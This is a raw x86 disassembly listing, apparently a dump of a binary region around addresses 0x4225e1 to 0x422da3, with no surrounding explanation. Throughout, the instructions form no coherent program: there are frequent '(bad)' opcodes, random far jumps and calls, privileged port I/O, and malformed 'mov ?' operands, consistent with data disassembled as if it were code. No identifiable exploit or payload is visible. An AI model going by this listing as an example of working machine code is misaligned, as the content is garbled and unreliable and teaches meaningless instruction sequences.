  4225e1:	retf   0x86b0
  4225e4:	mov    eax,0xbdfc577f
  4225e9:	dec    esp
  4225ea:	imul   eax,DWORD PTR [esi],0x2cec082c
  4225f0:	(bad)  
  4225f1:	jecxz  0x422663
  4225f3:	jnp    0x422628
  4225f5:	or     esp,DWORD PTR [ebx-0xf]
  4225f8:	adc    DWORD PTR [eax-0x69],ebx
  4225fb:	stc    
  4225fc:	push   esp
  4225fd:	in     al,dx
  4225fe:	in     eax,0xfa
  422600:	inc    esi
  422601:	dec    edx
  422602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422603:	repnz lds ecx,FWORD PTR [eax-0x19454eb5]
  42260a:	xchg   BYTE PTR [eax+0x72],ch
  42260d:	dec    ebx
  42260e:	sar    cl,0xc1
  422611:	or     eax,ebx
  422613:	arpl   WORD PTR [eax],cx
  422615:	aaa    
  422616:	push   edx
  422617:	test   DWORD PTR [ecx-0x4c046578],ebp
  42261d:	sub    ch,dl
  42261f:	adc    eax,0xa7a37252
  422624:	(bad)  
  422625:	ds mov ecx,0x63ba3329
  42262b:	jmp    0x4225df
  42262d:	cs test al,0x35
  422630:	sbb    BYTE PTR [edx-0xd],al
  422633:	and    eax,0x2f60be1
  422638:	popf   
  422639:	dec    ebp
  42263a:	adc    BYTE PTR [eax+0x1e],0xa8
  42263e:	jle    0x422632
  422640:	mov    dl,0xc1
  422642:	test   BYTE PTR [edi+edi*1],bl
  422645:	ss push ebx
  422647:	loop   0x422644
  422649:	or     eax,DWORD PTR [eax-0x4d]
  42264c:	push   esp
  42264d:	jb     0x4225df
  42264f:	and    al,0xbb
  422651:	push   0xffffff9a
  422653:	push   esp
  422654:	cmp    bl,BYTE PTR [ebx+ebp*2-0x118f898e]
  42265b:	mov    ecx,0xe71b9b57
  422660:	shl    BYTE PTR [ebx],0x63
  422663:	dec    esi
  422664:	push   ecx
  422665:	inc    esi
  422666:	xchg   esp,eax
  422667:	repz sbb DWORD PTR [eax-0x2b],ebp
  42266b:	xchg   DWORD PTR [esi-0x6ed05f8],ecx
  422671:	or     al,0x33
  422673:	sub    al,0xc8
  422675:	sbb    eax,0x936a78f
  42267a:	test   eax,0x6ca3b3e4
  42267f:	adc    edi,DWORD PTR [edi-0x6dd93243]
  422685:	jmp    0x2df5:0xc4aaa791
  42268c:	push   cs
  42268d:	ror    BYTE PTR [esi-0x67],1
  422690:	mov    dl,0xdb
  422692:	hlt    
  422693:	fidivr DWORD PTR [edi]
  422695:	js     0x422673
  422697:	scas   eax,DWORD PTR es:[edi]
  422698:	lahf   
  422699:	or     DWORD PTR [ebp-0x63a47f74],esi
  42269f:	or     eax,0x7ec1a852
  4226a4:	mov    dl,0x6
  4226a6:	nop
  4226a7:	push   0x63d379fc
  4226ac:	xor    esi,ebp
  4226ae:	fsub   DWORD PTR [edi+0x2bde8e25]
  4226b4:	cmp    dh,ah
  4226b6:	xchg   edi,eax
  4226b7:	push   cs
  4226b8:	mov    dl,0x1b
  4226ba:	mov    ch,0x84
  4226bc:	lods   eax,DWORD PTR ds:[esi]
  4226bd:	ror    DWORD PTR [edi+edx*8+0x61],0xb
  4226c2:	inc    esi
  4226c3:	call   0x7fd2bb4d
  4226c8:	leave  
  4226c9:	ins    BYTE PTR es:[edi],dx
  4226ca:	popf   
  4226cb:	cmp    esp,edi
  4226cd:	shl    DWORD PTR [ebx+edx*8+0x1bae52a2],1
  4226d4:	sahf   
  4226d5:	or     ecx,DWORD PTR [eax+0x35]
  4226d8:	and    eax,0x24ab5a36
  4226dd:	jmp    0x422679
  4226df:	stos   BYTE PTR es:[edi],al
  4226e0:	pop    ebp
  4226e1:	inc    eax
  4226e2:	mov    ebx,0x3187efd0
  4226e7:	jmp    0x4226f1
  4226e9:	stc    
  4226ea:	call   0xdb6:0x1084ec04
  4226f1:	jo     0x422697
  4226f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226f4:	or     BYTE PTR [ebx],0x8c
  4226f7:	push   ss
  4226f8:	push   edx
  4226f9:	and    al,0xb4
  4226fb:	test   eax,0xa5060bdb
  422700:	dec    ecx
  422701:	fild   DWORD PTR [esp+eax*1]
  422704:	add    bh,dl
  422706:	popf   
  422707:	mov    cl,BYTE PTR [esi]
  422709:	push   es
  42270a:	in     eax,0xc
  42270c:	sub    ecx,DWORD PTR [ebx]
  42270e:	fcmovb st,st(3)
  422710:	cmp    al,0x42
  422712:	push   ebx
  422713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422714:	lea    esi,[esi+0x5d27b79d]
  42271a:	sar    DWORD PTR [ebx],1
  42271c:	mov    bl,0x6b
  42271e:	cmp    DWORD PTR [ecx],esi
  422720:	xchg   DWORD PTR [edx+esi*8+0x2b124611],esi
  422727:	mov    al,ds:0x95134548
  42272c:	daa    
  42272d:	fist   DWORD PTR [edi+0x6e3b62d7]
  422733:	in     eax,dx
  422734:	mov    dl,0x26
  422736:	adc    DWORD PTR [ebp+eiz*4+0x8],edi
  42273a:	lods   al,BYTE PTR ds:[esi]
  42273b:	fldcw  WORD PTR [edx]
  42273d:	or     esp,ecx
  42273f:	sbb    bl,BYTE PTR [ecx+0x7c]
  422742:	ins    DWORD PTR es:[edi],dx
  422743:	jle    0x4227bc
  422745:	sti    
  422746:	mov    BYTE PTR [esi],dh
  422748:	xchg   ebp,eax
  422749:	fistp  DWORD PTR [ebx+0xc4f8258]
  42274f:	fwait
  422750:	push   esi
  422751:	and    DWORD PTR [ebp-0x59],ecx
  422754:	mov    eax,ds:0x68cc5b8d
  422759:	mov    esp,0x7fb3e008
  42275e:	mov    BYTE PTR [ebp+0x59195844],al
  422764:	inc    edx
  422765:	push   eax
  422766:	cmp    DWORD PTR [ebp-0x5565c846],ebx
  42276c:	and    al,0x40
  42276e:	out    dx,eax
  42276f:	out    0x19,eax
  422771:	in     eax,0x9a
  422773:	pop    ds
  422774:	out    0xa2,al
  422776:	xor    al,0x5b
  422778:	or     ecx,DWORD PTR [ecx]
  42277a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42277c:	and    eax,0x3edff2e9
  422781:	cs out 0x7d,eax
  422784:	mov    dl,0xee
  422786:	add    bh,BYTE PTR [edx]
  422788:	dec    ebx
  422789:	shr    BYTE PTR ds:0xee082c09,1
  42278f:	into   
  422790:	cwde   
  422791:	pop    es
  422792:	cmp    al,0xe5
  422794:	jp     0x4227db
  422796:	imul   eax,edi,0xffffffb2
  422799:	inc    ebx
  42279a:	int3   
  42279b:	inc    edx
  42279c:	mov    esp,0xae11304a
  4227a1:	push   ss
  4227a2:	jbe    0x422790
  4227a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a5:	dec    eax
  4227a6:	xchg   ecx,eax
  4227a7:	cwde   
  4227a8:	mov    esi,0x8af19a9c
  4227ad:	push   esi
  4227ae:	in     eax,0x52
  4227b0:	imul   esi,DWORD PTR [edi-0xf],0x75790a7
  4227b7:	sub    BYTE PTR [edi-0x4a7216c0],bl
  4227bd:	push   ss
  4227be:	scas   al,BYTE PTR es:[edi]
  4227bf:	lds    edx,FWORD PTR [ebp-0x42]
  4227c2:	jmp    0x5059:0xa2fdea02
  4227c9:	or     ecx,DWORD PTR [esi+0x23]
  4227cc:	dec    edi
  4227cd:	icebp  
  4227ce:	mov    eax,ds:0xe7046a53
  4227d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d4:	mov    dl,0x1f
  4227d6:	pop    eax
  4227d7:	fucom  st(6)
  4227d9:	mov    edi,0xb046b6f
  4227de:	les    esi,FWORD PTR [edi-0x52340797]
  4227e4:	push   ds
  4227e5:	mov    ebx,0x77c9799a
  4227ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227eb:	ins    BYTE PTR es:[edi],dx
  4227ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227ed:	mov    bl,0x27
  4227ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227f0:	xchg   ebp,eax
  4227f1:	nop
  4227f2:	mov    ecx,0x1d699896
  4227f7:	fwait
  4227f8:	mov    dl,0x33
  4227fa:	xchg   edx,eax
  4227fb:	add    ah,0xc1
  4227fe:	and    al,0x95
  422800:	mov    al,0x8
  422802:	pushf  
  422803:	dec    ecx
  422804:	ss inc edx
  422806:	sbb    BYTE PTR ss:[edx+0x6e],al
  42280a:	pusha  
  42280b:	inc    edx
  42280c:	mov    dl,0x97
  42280e:	mov    BYTE PTR [ebx+0x54],dh
  422811:	aam    0x32
  422813:	lds    esi,FWORD PTR [ecx+0x7344390b]
  422819:	mov    esp,0x21a32607
  42281e:	call   0xb4a6:0x6c38aa71
  422825:	adc    bh,bh
  422827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422828:	inc    ecx
  422829:	jmp    0x8a11b7f3
  42282e:	stos   DWORD PTR es:[edi],eax
  42282f:	cli    
  422830:	mov    edi,DWORD PTR [ebx+0x0]
  422833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422834:	jae    0x42287f
  422836:	xor    eax,0xd3524c72
  42283b:	lods   al,BYTE PTR ds:[esi]
  42283c:	adc    BYTE PTR [ecx+0x40326c34],bl
  422842:	and    esi,DWORD PTR [ebx-0x4e649f94]
  422848:	xchg   esp,eax
  422849:	adc    eax,0x8759182e
  42284e:	mov    edx,0xf80c3b9c
  422853:	lahf   
  422854:	dec    esp
  422855:	mov    dh,BYTE PTR [edi+0x6deecea7]
  42285b:	sti    
  42285c:	mov    ah,BYTE PTR [ebp-0x1c732145]
  422862:	dec    ebx
  422863:	push   esp
  422864:	mov    dl,0x7c
  422866:	hlt    
  422867:	fcomip st,st(3)
  422869:	lea    esp,[ebp+0x36]
  42286c:	dec    ecx
  42286d:	push   ebx
  42286e:	jle    0x4228e9
  422870:	mov    dl,0x11
  422872:	dec    eax
  422873:	dec    esp
  422874:	mov    eax,ds:0xaf337790
  422879:	mov    ah,0x92
  42287b:	dec    esi
  42287c:	pop    edx
  42287d:	mov    esi,0xb29be69a
  422882:	les    ecx,FWORD PTR [ebp-0x36]
  422885:	ret    0xf772
  422888:	mov    bl,0xd2
  42288a:	in     eax,dx
  42288b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42288c:	cmp    al,0xf2
  42288e:	outs   dx,BYTE PTR ds:[esi]
  42288f:	and    eax,0xf61f25cd
  422894:	mov    cl,0xdc
  422896:	cld    
  422897:	in     al,0xb1
  422899:	xor    BYTE PTR [edi+0x67],0x60
  42289d:	(bad)  
  42289e:	jnp    0x422847
  4228a0:	dec    ebx
  4228a1:	add    DWORD PTR [edi-0xb],ebp
  4228a4:	inc    esp
  4228a5:	mov    bl,0xe7
  4228a7:	push   ss
  4228a8:	lea    ecx,[esp+esi*4+0x27]
  4228ac:	sbb    al,BYTE PTR [edi-0x6c716999]
  4228b2:	cmp    DWORD PTR [eax-0x215829c4],esp
  4228b8:	in     al,dx
  4228b9:	mov    ebx,0xaf82afb9
  4228be:	fwait
  4228bf:	out    dx,al
  4228c0:	mov    ebx,0xf88f0a5f
  4228c5:	or     dl,BYTE PTR [edx-0x4e]
  4228c8:	daa    
  4228c9:	or     ecx,DWORD PTR [eax-0x33b7e314]
  4228cf:	leave  
  4228d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228d1:	mov    ds:0x2c94019a,al
  4228d6:	adc    bl,BYTE PTR [esi-0x2174be2c]
  4228dc:	jns    0x42295a
  4228de:	arpl   WORD PTR [edi-0x47a6b35b],sp
  4228e4:	sbb    eax,0x76b2be76
  4228ea:	dec    ebp
  4228eb:	pop    ebp
  4228ec:	push   ecx
  4228ed:	xor    BYTE PTR [edi],cl
  4228ef:	lock inc eax
  4228f1:	or     ecx,DWORD PTR [esi+0x2f]
  4228f4:	jne    0x42294b
  4228f6:	mov    ds:0x931eebb0,al
  4228fb:	sub    BYTE PTR [ebx-0x515bd813],ah
  422901:	out    dx,al
  422902:	and    al,0x57
  422904:	adc    ebx,ebp
  422906:	cmp    eax,0x5e0bf63f
  42290b:	rcl    BYTE PTR [esi],0x38
  42290e:	(bad)  
  42290f:	pop    ds
  422910:	outs   dx,BYTE PTR ds:[esi]
  422911:	xchg   edi,eax
  422912:	loop   0x4228ee
  422914:	mov    dl,0xa9
  422916:	out    0x72,al
  422918:	and    DWORD PTR [edx+eiz*4-0x4bf4583a],edi
  42291f:	and    eax,0x49a38093
  422924:	mov    dh,0xb2
  422926:	popf   
  422927:	cs mov ah,0x4b
  42292a:	jmp    0x422915
  42292c:	adc    cl,BYTE PTR [edx+0xbeb404b]
  422932:	mov    al,0x7b
  422934:	push   ebx
  422935:	outs   dx,BYTE PTR ds:[esi]
  422936:	ret    0xd593
  422939:	and    ebx,DWORD PTR [edx-0x4bc1de61]
  42293f:	jmp    0xe0dc:0xa76cf1f9
  422946:	adc    bh,BYTE PTR [edi]
  422948:	gs pop ecx
  42294a:	sub    al,0x66
  42294c:	mov    dl,0xb9
  42294e:	sbb    ecx,DWORD PTR [ecx]
  422950:	outs   dx,BYTE PTR ds:[esi]
  422951:	xchg   ebp,eax
  422952:	xor    edi,DWORD PTR [esp+edx*4+0x57]
  422956:	adc    eax,0xffafb272
  42295b:	xor    eax,0x4be344b4
  422960:	mov    ?,edi
  422962:	push   eax
  422963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422964:	mov    ds:0x31c77e38,al
  422969:	jns    0x42299d
  42296b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296c:	jae    0x4229cc
  42296e:	rol    BYTE PTR [edi-0x3e],cl
  422971:	fcmove st,st(6)
  422973:	dec    edx
  422974:	(bad)  
  422975:	mov    esp,DWORD PTR [edi+0x530a0a1c]
  42297b:	xor    BYTE PTR [edx+0x4693b453],al
  422981:	shl    dl,cl
  422983:	pushf  
  422984:	bound  edi,QWORD PTR [eax-0x66]
  422987:	fidivr DWORD PTR [ebp+0xc]
  42298a:	ffreep st(5)
  42298c:	into   
  42298d:	sbb    DWORD PTR [edx-0x312fc42d],ebx
  422993:	sbb    bl,BYTE PTR [edx]
  422995:	xor    BYTE PTR [eax-0x59],ah
  422998:	ja     0x422961
  42299a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42299b:	cmp    ecx,DWORD PTR [eax-0x4d69ab2b]
  4229a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a2:	mov    ds:0x5d70c207,al
  4229a7:	sahf   
  4229a8:	xor    DWORD PTR [ebx],ecx
  4229aa:	adc    DWORD PTR [edi+0x6e],0xa
  4229ae:	out    dx,eax
  4229af:	ror    BYTE PTR fs:[edi-0x66],cl
  4229b3:	aas    
  4229b4:	call   0x38b5dc62
  4229b9:	jo     0x4229b6
  4229bb:	popf   
  4229bc:	mov    edx,0x8b1a070c
  4229c1:	dec    eax
  4229c2:	jns    0x422994
  4229c4:	aaa    
  4229c5:	rol    BYTE PTR [edx],0xeb
  4229c8:	mov    WORD PTR [ebp+ebx*4-0x37],gs
  4229cc:	ret    
  4229cd:	cmp    BYTE PTR [ebx+0x72],bl
  4229d0:	jb     0x422991
  4229d2:	(bad)  
  4229d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229d4:	pop    ebx
  4229d5:	or     esp,DWORD PTR [esi+0x1319d151]
  4229db:	sub    al,0xab
  4229dd:	jo     0x42297e
  4229df:	jge    0x4229c7
  4229e1:	xchg   DWORD PTR [edi],esi
  4229e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229e4:	jb     0x422998
  4229e6:	or     DWORD PTR [ebx-0x64],ecx
  4229e9:	inc    ebx
  4229ea:	fldenv [edx+esi*4+0x38]
  4229ee:	mov    eax,ds:0x76218a4
  4229f3:	lock mov cl,BYTE PTR [ecx-0x48]
  4229f7:	sbb    DWORD PTR [edx],esi
  4229f9:	adc    eax,0xe36f8611
  4229fe:	fidivr DWORD PTR [edi+0x7e]
  422a01:	jge    0x4229ff
  422a03:	dec    edx
  422a04:	leave  
  422a05:	or     eax,DWORD PTR [ebx]
  422a07:	cmp    eax,0x241ba36
  422a0c:	add    DWORD PTR [eax-0x63],esp
  422a0f:	call   0x2192:0x93793462
  422a16:	pop    edx
  422a17:	or     eax,0x3150bb0
  422a1c:	and    eax,0x8abde1a5
  422a21:	hlt    
  422a22:	call   0x8eb6:0xc14d6e41
  422a29:	sti    
  422a2a:	pop    es
  422a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a2c:	aam    0x5b
  422a2e:	jge    0x4229b6
  422a30:	jge    0x422a10
  422a32:	add    DWORD PTR [ebp-0x3ae1c07e],edx
  422a38:	push   ebx
  422a39:	shl    dh,cl
  422a3b:	push   ebp
  422a3c:	fisttp QWORD PTR [ebx]
  422a3e:	sahf   
  422a3f:	ss jmp 0xeb60:0x94ed5abd
  422a47:	and    eax,0x84cb17b2
  422a4c:	(bad)  
  422a4d:	bound  ebp,QWORD PTR [ebp+edx*4+0x11]
  422a51:	cmc    
  422a52:	jb     0x4229fb
  422a54:	stos   DWORD PTR es:[edi],eax
  422a55:	sbb    ebx,DWORD PTR [ebx-0x30cf9f44]
  422a5b:	mov    ?,edx
  422a5d:	out    0x70,eax
  422a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a60:	js     0x4229ec
  422a62:	sub    DWORD PTR [ecx+0x4390c5aa],edx
  422a68:	or     eax,0x82046809
  422a6d:	mov    ch,0x7a
  422a6f:	cmp    edx,DWORD PTR [edx-0x54]
  422a72:	xchg   ebp,eax
  422a73:	div    BYTE PTR [edx-0x5da79fe1]
  422a79:	std    
  422a7a:	fidiv  DWORD PTR [esi+0x74]
  422a7d:	xor    eax,0x6b2b623
  422a82:	sbb    esi,DWORD PTR [ebp+0x3d]
  422a85:	stos   BYTE PTR es:[edi],al
  422a86:	jg     0x422a77
  422a88:	mov    dh,0x9a
  422a8b:	test   edi,0x1e9bafd8
  422a91:	inc    edi
  422a92:	dec    esp
  422a93:	inc    ebx
  422a94:	mov    BYTE PTR [eax+0x4ab4a048],ch
  422a9a:	sbb    bl,0xfc
  422a9d:	jne    0x422a39
  422a9f:	dec    edi
  422aa0:	hlt    
  422aa1:	jno    0x422acd
  422aa3:	ret    0xce54
  422aa6:	fwait
  422aa7:	mov    ds:0x1ba0760,al
  422aac:	inc    ebx
  422aad:	retf   0xf5aa
  422ab0:	pop    es
  422ab1:	or     al,0x18
  422ab3:	arpl   WORD PTR [ecx+0x22071aab],cx
  422ab9:	(bad)  
  422aba:	push   ebx
  422abb:	xor    DWORD PTR [edx+0x16d1a09e],0xffffffd4
  422ac2:	push   0x3f
  422ac4:	dec    BYTE PTR [ecx]
  422ac6:	jnp    0x422ad0
  422ac8:	mov    ah,0xb4
  422aca:	aad    0x7c
  422acc:	repnz mov ds:0x98b284c4,al
  422ad2:	call   FWORD PTR [edi+eax*8-0x6b]
  422ad6:	xor    BYTE PTR [ebp+0x5c],ah
  422ad9:	or     edi,DWORD PTR [ebp-0x50]
  422adc:	daa    
  422add:	loopne 0x422a61
  422adf:	add    al,0x9a
  422ae1:	and    dl,BYTE PTR [ebp+0x612b4026]
  422ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae8:	add    al,0xa
  422aea:	call   0x4b4db0a1
  422aef:	pop    eax
  422af0:	xchg   esp,eax
  422af1:	jae    0x422ab3
  422af3:	rol    dh,1
  422af5:	sbb    al,0x9a
  422af7:	pushf  
  422af8:	lahf   
  422af9:	inc    esp
  422afa:	or     DWORD PTR [ecx-0x2c],edx
  422afd:	(bad)  
  422afe:	fmul   st(4),st
  422b00:	pop    ds
  422b01:	xchg   edi,eax
  422b02:	lds    esp,FWORD PTR [edi-0x2426c326]
  422b08:	mov    BYTE PTR [ebx],cl
  422b0a:	stos   DWORD PTR es:[edi],eax
  422b0b:	in     eax,dx
  422b0c:	and    bl,BYTE PTR [ecx-0x1e]
  422b0f:	fwait
  422b10:	cmp    al,0xc3
  422b12:	call   0xbcd4:0x58d29f19
  422b19:	mov    dh,0xe8
  422b1b:	fwait
  422b1c:	dec    ecx
  422b1d:	jmp    0x5ac5:0x4213031a
  422b24:	sub    eax,0x11e99a0d
  422b29:	cmp    esi,esi
  422b2b:	jno    0x422b74
  422b2d:	fld    DWORD PTR [esi-0x59]
  422b30:	cmp    bl,BYTE PTR [eax+0x86cfdca]
  422b36:	mov    ds:0xac53b2c3,eax
  422b3b:	nop
  422b3c:	push   DWORD PTR [esi+0x4f]
  422b3f:	push   eax
  422b40:	fst    QWORD PTR [ebx+edi*1]
  422b43:	cmp    eax,0x301a8933
  422b48:	(bad)  
  422b49:	shl    BYTE PTR [esi-0x18],cl
  422b4c:	mov    dl,0x1e
  422b4e:	sub    BYTE PTR [ebp+0x55bc9a2c],0x13
  422b55:	or     edi,DWORD PTR ds:0x796b0654
  422b5b:	leave  
  422b5c:	mov    ds:0x44b29aec,al
  422b61:	dec    edi
  422b62:	dec    edi
  422b63:	mov    esp,es
  422b65:	mov    bl,0xaa
  422b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b68:	adc    edx,DWORD PTR [eax-0x29]
  422b6b:	sub    DWORD PTR [esi+eiz*4],0x4dbcd6c7
  422b72:	pop    ss
  422b73:	lea    edi,[esi+0x6c]
  422b76:	fucomi st,st(3)
  422b78:	jge    0x422b25
  422b7a:	mov    bh,cl
  422b7c:	jmp    0xff0b:0x4a5d4db6
  422b83:	push   ss
  422b84:	or     al,0x67
  422b86:	lock mov esi,0xe29aa391
  422b8c:	aam    0x11
  422b8e:	out    dx,al
  422b8f:	pop    esi
  422b90:	and    ecx,DWORD PTR [ebx+0x54]
  422b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b94:	xor    edi,ebx
  422b96:	imul   eax,DWORD PTR [eiz*4-0x4e9c32f9],0x401a21ee
  422ba1:	or     eax,0x502e6f7a
  422ba6:	outs   dx,BYTE PTR ds:[esi]
  422ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ba8:	jmp    0x422b8e
  422baa:	or     dl,BYTE PTR [ecx+edx*4]
  422bad:	sbb    ah,BYTE PTR [edx+0x6a]
  422bb0:	pop    DWORD PTR [eax-0x262a58f7]
  422bb6:	sbb    eax,0x66309d30
  422bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bbc:	daa    
  422bbd:	jp     0x422bdf
  422bbf:	xchg   ebp,eax
  422bc0:	add    al,0x13
  422bc2:	(bad)  
  422bc3:	ins    DWORD PTR es:[edi],dx
  422bc4:	mov    dl,0x31
  422bc6:	adc    ebx,DWORD PTR [edx]
  422bc8:	push   ss
  422bc9:	dec    ebp
  422bca:	mov    bl,0xd2
  422bcc:	pop    edx
  422bcd:	or     edi,DWORD PTR [edx]
  422bcf:	or     BYTE PTR [edi-0x7a24c4a1],bl
  422bd5:	cmp    eax,0xd404e09a
  422bda:	pusha  
  422bdb:	xor    DWORD PTR [eax-0x53],ebp
  422bde:	fisub  DWORD PTR [edi+0x53627a2]
  422be4:	iret   
  422be5:	mov    cl,BYTE PTR [ecx+0x6e]
  422be8:	mov    dl,0x56
  422bea:	and    DWORD PTR [ebx+0x3ba7b4af],ebp
  422bf0:	mov    cs,WORD PTR [ebx]
  422bf2:	mov    bl,0x3d
  422bf4:	fist   WORD PTR [ebx+0x385d5459]
  422bfa:	call   0x66c5:0xf6bae1a1
  422c01:	mov    ds,WORD PTR [eax-0x59]
  422c04:	cmp    eax,ebx
  422c06:	sub    DWORD PTR [edi-0x444c77bd],esi
  422c0c:	scas   al,BYTE PTR es:[edi]
  422c0d:	fs and eax,0x1ae62c3d
  422c13:	adc    ebx,ebx
  422c15:	jmp    0x422c29
  422c17:	add    eax,0xae2c0beb
  422c1c:	push   cs
  422c1d:	mov    esp,0x8c87fcbf
  422c22:	push   0x34f5b2bd
  422c27:	mov    dh,0xb3
  422c29:	xor    edx,DWORD PTR [ecx+0x440baa65]
  422c2f:	mov    eax,ds:0xb81165dd
  422c34:	das    
  422c35:	rol    BYTE PTR [esp+eax*4-0x1ca58a13],0x5b
  422c3d:	or     ah,bl
  422c3f:	or     BYTE PTR [ebx-0x7d61d6f5],bl
  422c45:	les    edx,FWORD PTR [edi-0x6542a2cd]
  422c4b:	sti    
  422c4c:	ret    
  422c4d:	out    dx,eax
  422c4e:	int    0xe4
  422c50:	arpl   WORD PTR [ebp+ecx*1-0x1bb0e555],sp
  422c57:	sub    dl,dh
  422c59:	ja     0x422bec
  422c5b:	or     al,0xfb
  422c5d:	mov    ecx,0xec67a7d2
  422c62:	fs pop ds
  422c64:	mov    ebx,0xb595b00c
  422c69:	lds    ebp,FWORD PTR [ecx+0x429bb740]
  422c6f:	shl    edi,0x53
  422c72:	call   0x702f:0xe040ee5
  422c79:	lock inc ebp
  422c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c7d:	cdq    
  422c7e:	mov    esp,0x1bcea832
  422c83:	popa   
  422c84:	mov    edi,DWORD PTR ds:0x8d582785
  422c8a:	imul   ebp,DWORD PTR [eax+0xc],0xfffffffe
  422c8e:	sahf   
  422c8f:	lahf   
  422c90:	sti    
  422c91:	and    BYTE PTR [edx],bl
  422c93:	pushf  
  422c94:	mov    ebx,0xb9b129b6
  422c99:	mov    al,0x9a
  422c9b:	clc    
  422c9c:	jmp    0xfd0ed8fc
  422ca1:	xlat   BYTE PTR ds:[ebx]
  422ca2:	jmp    DWORD PTR [edi-0x231df1f4]
  422ca8:	enter  0x82c5,0x1b
  422cac:	mov    dl,0xe8
  422cae:	and    eax,0x58ab259e
  422cb3:	push   esp
  422cb4:	into   
  422cb5:	or     eax,DWORD PTR [esi+0x76]
  422cb8:	mov    al,ds:0x3fa257fa
  422cbd:	(bad)  
  422cbe:	call   0xfbc9:0xb28ea7f0
  422cc5:	lods   al,BYTE PTR ds:[esi]
  422cc6:	or     al,0xa4
  422cc8:	(bad)  
  422cc9:	jno    0x422cec
  422ccb:	cmp    eax,0xb832b580
  422cd0:	ror    BYTE PTR [ecx-0x66],1
  422cd3:	je     0x422d25
  422cd5:	xor    eax,DWORD PTR [ecx+0x74edd18]
  422cdb:	mov    eax,ds:0xb932ed08
  422ce0:	std    
  422ce1:	sti    
  422ce2:	fwait
  422ce3:	jb     0x422d28
  422ce5:	ss mov esi,0xf47f209f
  422ceb:	pop    ss
  422cec:	sti    
  422ced:	mov    al,0x9a
  422cef:	jns    0x422cd1
  422cf1:	scas   eax,DWORD PTR es:[edi]
  422cf2:	rol    BYTE PTR [eax-0x587eded4],0x3d
  422cf9:	icebp  
  422cfa:	das    
  422cfb:	aas    
  422cfc:	cmp    BYTE PTR [ebx],al
  422cfe:	lock retf 0xc2b2
  422d02:	in     eax,dx
  422d03:	and    DWORD PTR [esi-0x30],eax
  422d06:	aad    0x71
  422d08:	das    
  422d09:	or     ch,BYTE PTR [ebp-0x6a181986]
  422d0f:	sahf   
  422d10:	je     0x422cf5
  422d12:	jno    0x422d10
  422d14:	mov    BYTE PTR [ecx],bl
  422d16:	(bad)  
  422d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d18:	adc    al,0xe5
  422d1a:	mov    esp,0x99461e09
  422d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d20:	clc    
  422d21:	sub    ch,bl
  422d23:	jae    0x422ca6
  422d25:	rcl    BYTE PTR [edx-0x3],0xb2
  422d29:	aaa    
  422d2a:	or     esi,edx
  422d2c:	cmp    DWORD PTR [ebp-0x74],esi
  422d2f:	push   esp
  422d30:	mov    esp,0x189ffa0b
  422d35:	sbb    ebx,esi
  422d37:	push   edi
  422d38:	stc    
  422d39:	nop
  422d3a:	xchg   ebp,eax
  422d3b:	in     al,0xc1
  422d3d:	cmp    bl,ah
  422d3f:	inc    edi
  422d40:	(bad)  
  422d41:	fbstp  TBYTE PTR [eax+ebx*1-0x2234f4b6]
  422d48:	jne    0x422cd8
  422d4a:	mov    ?,WORD PTR [ebx]
  422d4c:	pop    ebp
  422d4d:	loopne 0x422ce8
  422d4f:	loop   0x422cf2
  422d51:	mov    edi,DWORD PTR [eax]
  422d53:	jp     0x422cdd
  422d55:	sti    
  422d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d57:	jnp    0x422d03
  422d59:	or     ch,BYTE PTR [esi]
  422d5b:	rcr    ebp,cl
  422d5d:	xor    ebx,DWORD PTR [ecx-0x4810acca]
  422d63:	xor    BYTE PTR [edx],dl
  422d65:	shl    DWORD PTR [eax-0x31],cl
  422d68:	mov    dl,0x86
  422d6a:	mov    bl,0x4f
  422d6c:	(bad)  
  422d6d:	adc    eax,0xb6450e7
  422d72:	xor    al,0x2c
  422d74:	pop    ds
  422d75:	inc    ecx
  422d76:	and    ecx,DWORD PTR [eax+0x17ed9ba1]
  422d7c:	adc    dh,bl
  422d7e:	sbb    DWORD PTR [ebx+0x52dad6bd],0x32
  422d85:	outs   dx,BYTE PTR ds:[esi]
  422d86:	in     al,0xfc
  422d88:	mov    bl,0xb5
  422d8a:	jge    0x422d0f
  422d8c:	sbb    BYTE PTR [edx+0x363b29ea],cl
  422d92:	in     al,dx
  422d93:	add    al,0x32
  422d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d96:	dec    edx
  422d97:	push   ecx
  422d98:	repz in al,0x12
  422d9b:	push   0x5e5ebca1
  422da0:	mov    dl,0x88
  422da2:	cmc    
  422da3:	js     0x422d46
